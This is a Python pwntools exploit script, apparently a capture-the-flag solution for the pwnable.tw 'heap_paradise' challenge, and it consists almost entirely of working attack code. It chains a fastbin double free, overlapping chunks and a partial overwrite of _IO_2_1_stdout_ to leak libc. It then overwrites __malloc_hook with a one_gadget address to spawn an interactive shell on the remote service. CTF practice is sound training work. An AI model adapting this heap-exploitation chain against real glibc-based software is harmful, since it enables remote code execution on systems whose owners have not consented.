from pwn import *

locdbg=False

host='chall.pwnable.tw'
port=10308
filename='./heap_paradise'
libcname='./libc_64.so.6'
elf=ELF(filename)
slpt=0.2
context.terminal=['tmux','split-window','-h']
if locdbg:
    p=process(filename)
    libc=ELF('../../glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6')
    context.log_level='debug'
    oneg=0xf0897
else:
    p=remote(host,port)
    libc=ELF(libcname)
    context.log_level='debug'
    oneg=0xf0567

#print(p.pid)
def pwndbg(ctt):
    if locdbg:
        gdb.attach(p,gdbscript=ctt)

def slp():
    if not locdbg:
        sleep(slpt)

def fin():
    p.interactive()

def alc(size, data):
    p.sendlineafter(b'You Choice:', b'1')
    slp()
    p.sendlineafter(b'Size :', str(size).encode())
    slp()
    p.sendafter(b'Data :', data)
    slp()

def fr(index):
    p.sendlineafter(b'You Choice:', b'2')
    slp()
    p.sendlineafter(b'Index :', str(index).encode())
    slp()

alc(0x68,b'\0'*0x10+p64(0)+p64(0x71)) #0
alc(0x68,b'\0'*0x30+p64(0)+p64(0x31)) #1
fr(0)
fr(1)
fr(0)


alc(0x68,b'\x20') #2
alc(0x68,b'test4') #3
alc(0x68,b'test5') #4
alc(0x68,b'####') #5
fr(0)
alc(0x68,b'\0'*0x10+p64(0)+p64(0x91)) #6
fr(5)
fr(0)
fr(1)
alc(0x58,b'#'*0x40+p64(0)+p64(0x71)+b'\x80') #7
alc(0x68,p64(0)+p64(0x71)+b'\xdd\x95') #8
alc(0x68,b'test') #9
try:
    alc(0x68,b'\0'*0x33+p64(0xfbad1800)+p64(0)*3+b'\x40')#10
    libc_leak=u64(p.recvuntil(b'*')[0:8])
    libc_base=libc_leak-0x20-libc.symbols['_IO_2_1_stdout_']
except:
    log.debug('Fail!')
    exit(0)
log.success('libc_base= '+hex(libc_base))
mlc_hk=libc_base+libc.symbols['__malloc_hook']
fr(7)
fr(1)
alc(0x58,b'#'*0x40+p64(0)+p64(0x71)+p64(mlc_hk-0x23))#11
alc(0x68,b'test')#12
alc(0x68,b'\0'*0x13+p64(oneg+libc_base))#13
#alc(0x68,b'finish')#14
p.sendlineafter(b'You Choice:', b'1')
p.sendlineafter(b'Size :', str(0x68).encode())
fin()
